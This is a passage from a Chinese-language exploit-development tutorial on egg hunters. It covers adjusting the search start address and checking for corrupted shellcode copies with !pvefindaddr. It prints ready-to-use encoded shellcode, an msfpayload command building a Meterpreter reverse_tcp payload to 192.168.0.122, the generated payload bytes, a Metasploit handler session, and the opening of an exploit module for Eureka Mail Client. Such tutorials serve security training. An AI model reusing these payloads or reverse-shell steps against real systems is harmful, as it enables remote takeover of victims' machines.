而返（因为它从shellcode后面开始搜索）。显然，如果可以执行代码，并且shellcode代码就在栈上，那么可以很容
易的用一个短跳转（或长跳转）加上一个位移直接跳转到shellcode„„不过这样做不总是那么可靠。
无疑，肯定会出现一些情况，我们需要调整寻蛋代码使它从正确的位置开始搜索。（例如调整搜索位置在彩蛋
前面一点，然后再开始搜索）。
调试一下，你就会更清楚（当寻蛋代码开始执行时查看 EDI 寄存器，你就会找到搜索是从什么地方开始的）。
如果确实需要对寻蛋代码做这种修改,你值得花些时间对寻蛋代码的前几行指令做些研究。例如用00 00 替换 FF FF
将使搜索从当前的栈帧开始。当然这时代码中会包含你不得不处理的null字节。如果确实遇到了这个问题，那么需
要一点点创造性。通过用其他指令来替换0x66、0x81、0xCA、0xFF、0x0F指令可以使用开始搜索的位置更接近shellcode。
这里有一些常见的例子：
 找到当前栈帧的起始地址，把结果赋给EDI。
 把其他寄存器的值赋给EDI。
 找到堆的开始位置，把结果赋给EDI。（首先从TEB＋0x30得到PEB的值，然后从PEB＋0x90出得到进程堆）。
阅读这份文档学习更多构建搜索堆空间的寻蛋代码的方法。
 找到可执行镜像文件的基地址（Image Base Address）,把结果赋给EDI。
 把一个自定义的赋值给EDI（这是个危险的举动——类似与硬编码一个地址，所以确保这个位置在shellcode之
前）。你可以查看寻蛋代码执行时的寄存器的值，看是否某个寄存器的值比较适合(在真正的 shellcode 代码前，
且离shellcode足够近)放到EDI中。也许你可以考虑使用esp处的值（也许几个POP EDI指令就能给EDI一个有
用的值）。
 其他情况
当然，仅在以下情况下才建议调整开始搜索的位置：
 搜索速度难以接受。
 Exploit不能工作
 修改后exploit仍然是通用的或者这个exploit只需要使用一次。
总之，为的生成一个更好、更快、更小、更„„的exploit，你总是需要充分发挥你的创造性。
嗨，既然寻蛋代码在大多数情况下都工作良好，为什么我还需要改变开始地址？
这是个很值得思考的问题！
有时内存中可能存在最终的shellcode的多份拷贝。不过这里面有些拷贝被破坏(或被截断了)。这种情况下，就
必须修改搜索的开始位置来避开那些被破坏的拷贝。（毕竟寻蛋代码只寻找标记组成的 8 个字节而不检查后面的
shellcode的有效性）
可以使用”!pvefindaddr compare”命令来找出 shellcode 在内存中的位置以及有没有被破坏。注意这个功能
是在插件的1.16版本中加入的。
这个功能会搜索内存中的所有shellcode拷贝并和和指定的文件中保存的shellcode进行比较，并给出shellcode
拷贝的位置和该拷贝是否被破坏（被修改/截断）。根据结果信息，就可以知道是否要修改搜索的开始地址，如果要
修改，知道什么值合适。
下面示例如何使用该功能。
首先，需要把shellcode写进一个文件。可以使用下面的脚本来做到这一点。
# write shellcode for calc.exe to file called code.bin
# you can - of course - prepend this with egghunter tag
# if you want
#
my $shellcode="\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" .
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" .
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" .
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" .
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" .
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" .
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" .
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" .
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" .
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41";
open(FILE,">code.bin");
print FILE $shellcode;
print "Wrote ".length($shellcode)." bytes to file code.bin\n";
close(FILE);
（这里假定把文件写到C:\tmp.注意这里并没有在shellcode前面放置w00tw00t,这是因为这是一项通用的技术，
并非只对寻蛋技术有用）.
下一步，附加调试器到应用程序。放置一个可以在在shellcode执行前中断的断点，然后触发exploit.
现在运行下面的命令：
!pvefindaddr compare c:\tmp\code.bin
脚本将打开文件，取出前8个字节，然后在内存中寻找指向这8个字节的地址。在每一个找到的地址处，脚本
将把内存中的shellcode和文件中的进行比较，如果shellcode没有被修改，就会有如下输出：
如果存在差别（为了测试，我们故意修改几个字节）就会有如下输出：
 对每个不匹配的字节，日志中都会有一条信息：指明在shellcode中的位置、原始值（文件中的值）、内存中的
值。（我们可以参考这些信息做出一个bad char列表，以及考虑是否应该对shellcode做大小写转换等）
 底部有一个对应的可视化的展示。”-“表示不匹配的字节。
所以如果内存中的 shellcode 拷贝被破坏了，你可以重编码 shellcode过滤掉那些坏字符。但是如果内存中有一
个没有被破坏的拷贝，首先就可以想办法让寻蛋代码从一个首先找到没被破坏shellcode的地址开始搜索。
NOTE：
通过增加一个内存地址到命令行，可以把指定位置的内存处的字节和文件中的字节进行比较。
看看寻蛋代码对大的 shellcode是否工作正常。（这也是我们使用寻蛋方案的一个原因）
这次换用一个较大的shellcode试一下。在这次的exploit攻击中我们启动一个建立在TCP上的meterpreter会话
（一个连向攻击者的连接）。
首先生成 shellcode。 我的攻击电脑 IP 地址是 192.168.0.122.默认端口 4444。并限制只能使用字符编码，命令
行如下：
./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.122 R | ./msfencode -b
‘0×00′ -t perl -e x86/alpha_mixed
./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.122 R | ./msfencode -b
'0x00' -t perl -e x86/alpha_mixed
[*] x86/alpha_mixed succeeded with size 644 (iteration=1)
my $buf =
"\x89\xe5\xd9\xe5\xd9\x75\xf4\x5e\x56\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x49\x6c\x4b\x58\x4e\x69\x45\x50\x45\x50" .
"\x45\x50\x43\x50\x4c\x49\x4b\x55\x46\x51\x49\x42\x50\x64" .
"\x4e\x6b\x42\x72\x44\x70\x4c\x4b\x46\x32\x46\x6c\x4e\x6b" .
"\x43\x62\x45\x44\x4e\x6b\x44\x32\x51\x38\x46\x6f\x4c\x77" .
"\x50\x4a\x45\x76\x45\x61\x4b\x4f\x45\x61\x49\x50\x4e\x4c" .
"\x47\x4c\x43\x51\x43\x4c\x46\x62\x44\x6c\x51\x30\x4f\x31" .
"\x4a\x6f\x44\x4d\x43\x31\x4f\x37\x4d\x32\x4c\x30\x50\x52" .
"\x42\x77\x4e\x6b\x50\x52\x44\x50\x4e\x6b\x50\x42\x47\x4c" .
"\x43\x31\x4a\x70\x4e\x6b\x43\x70\x43\x48\x4b\x35\x49\x50" .
"\x43\x44\x43\x7a\x45\x51\x48\x50\x46\x30\x4e\x6b\x43\x78" .
"\x45\x48\x4c\x4b\x50\x58\x45\x70\x47\x71\x49\x43\x4a\x43" .
"\x47\x4c\x42\x69\x4c\x4b\x44\x74\x4e\x6b\x47\x71\x49\x46" .
"\x50\x31\x49\x6f\x50\x31\x4b\x70\x4e\x4c\x4b\x71\x4a\x6f" .
"\x44\x4d\x47\x71\x4b\x77\x45\x68\x4b\x50\x43\x45\x4a\x54" .
"\x47\x73\x43\x4d\x49\x68\x45\x6b\x43\x4d\x51\x34\x44\x35" .
"\x4d\x32\x51\x48\x4c\x4b\x42\x78\x51\x34\x47\x71\x4b\x63" .
"\x43\x56\x4e\x6b\x46\x6c\x50\x4b\x4c\x4b\x43\x68\x47\x6c" .
"\x45\x51\x4e\x33\x4e\x6b\x45\x54\x4e\x6b\x46\x61\x4a\x70" .
"\x4c\x49\x50\x44\x51\x34\x45\x74\x51\x4b\x43\x6b\x51\x71" .
"\x51\x49\x50\x5a\x42\x71\x49\x6f\x4d\x30\x51\x48\x43\x6f" .
"\x51\x4a\x4c\x4b\x44\x52\x4a\x4b\x4d\x56\x51\x4d\x51\x78" .
"\x46\x53\x46\x52\x45\x50\x47\x70\x50\x68\x42\x57\x50\x73" .
"\x50\x32\x51\x4f\x50\x54\x51\x78\x42\x6c\x44\x37\x46\x46" .
"\x43\x37\x49\x6f\x4e\x35\x4c\x78\x4c\x50\x46\x61\x43\x30" .
"\x45\x50\x46\x49\x4a\x64\x51\x44\x50\x50\x43\x58\x44\x69" .
"\x4f\x70\x42\x4b\x45\x50\x4b\x4f\x48\x55\x50\x50\x46\x30" .
"\x42\x70\x50\x50\x47\x30\x50\x50\x43\x70\x46\x30\x45\x38" .
"\x48\x6a\x46\x6f\x49\x4f\x49\x70\x4b\x4f\x4e\x35\x4f\x67" .
"\x42\x4a\x47\x75\x51\x78\x4f\x30\x4f\x58\x43\x30\x42\x5a" .
"\x50\x68\x46\x62\x43\x30\x42\x31\x43\x6c\x4c\x49\x4d\x36" .
"\x50\x6a\x42\x30\x46\x36\x46\x37\x42\x48\x4d\x49\x4e\x45" .
"\x42\x54\x51\x71\x49\x6f\x4e\x35\x4d\x55\x49\x50\x44\x34" .
"\x44\x4c\x49\x6f\x50\x4e\x44\x48\x50\x75\x4a\x4c\x43\x58" .
"\x4c\x30\x4c\x75\x49\x32\x42\x76\x49\x6f\x4a\x75\x43\x5a" .
"\x45\x50\x51\x7a\x43\x34\x42\x76\x50\x57\x51\x78\x45\x52" .
"\x4b\x69\x4b\x78\x43\x6f\x49\x6f\x48\x55\x4e\x6b\x46\x56" .
"\x51\x7a\x51\x50\x43\x58\x45\x50\x46\x70\x45\x50\x45\x50" .
"\x51\x46\x42\x4a\x45\x50\x50\x68\x51\x48\x4f\x54\x46\x33" .
"\x4d\x35\x4b\x4f\x4b\x65\x4e\x73\x46\x33\x42\x4a\x43\x30" .
"\x50\x56\x43\x63\x50\x57\x42\x48\x44\x42\x48\x59\x49\x58" .
"\x51\x4f\x49\x6f\x4b\x65\x43\x31\x49\x53\x46\x49\x4b\x76" .
"\x4d\x55\x4b\x46\x51\x65\x48\x6c\x49\x53\x47\x7a\x41\x41";
这次exploit脚本中，我们使用上面生成的shellcode来代替启动计算器的shellcode。
在运行exploit前，我们需要建立meterpreter 监听器：
./msfconsole
____________
------------
\ ,__,
\ (oo)____
(__) )\
||--|| *
=[ metasploit v3.3.4-dev [core:3.3 api:1.0]
+ -- --=[ 490 exploits - 227 auxiliary
+ -- --=[ 192 payloads - 23 encoders - 8 nops
=[ svn r8091 updated today (2010.01.09)
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > set LHOST 192.168.0.122
LHOST => 192.168.0.122
msf exploit(handler) > show options
Module options:
Name Current Setting Required Description
---- --------------- -------- -----------
Payload options (windows/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh, thread, process
LHOST 192.168.0.122 yes The local address
LPORT 4444 yes The local port
Exploit target:
Id Name
-- ----
0 Wildcard Target
msf exploit(handler) > exploit
[*] Starting the payload handler...
[*] Started reverse handler on port 4444
现在运行exploit脚本，触发Eureka溢出。几秒钟后就会看到下面的信息：
[*] Sending stage (723456 bytes)
[*] Meterpreter session 1 opened (192.168.0.122:4444 -> 192.168.0.193:15577)
meterpreter >
现在我们已经拥有了控制权。
把寻蛋技术（egg hunters）加入到 Metasploit 中
现在把我们Eureka Mail Client上的采用寻蛋方案的exploit转换成一个Metasploit模块。你可
以在下面地址找到关于制作Metasploit模块的最好的指导(而且还是免费的哦) :
http://www.offensive-security.com/metasploit-unleashed/Finding-a-Return-Address
这里是关于这个模块的简单描述:
 建立一个监听在110端口的POP3服务器
 计算正确的偏移量（这里我们会用到SRVHOST参数）
 假定客户端运行在XP SP3（如果你能找到其他操作系统上的正确的跳板地址，你可以增加这个列表）
NOTE: 在Metasploit中已经有了关于这个漏洞的metasploit模块（见exploits/windows/misc 目录下
的eureka_mail_err.rb）。不过我们将建立自己的模块。
下面就是一个做好的metasploit模块：
class Metasploit3 < Msf::Exploit::Remote
Rank = NormalRanking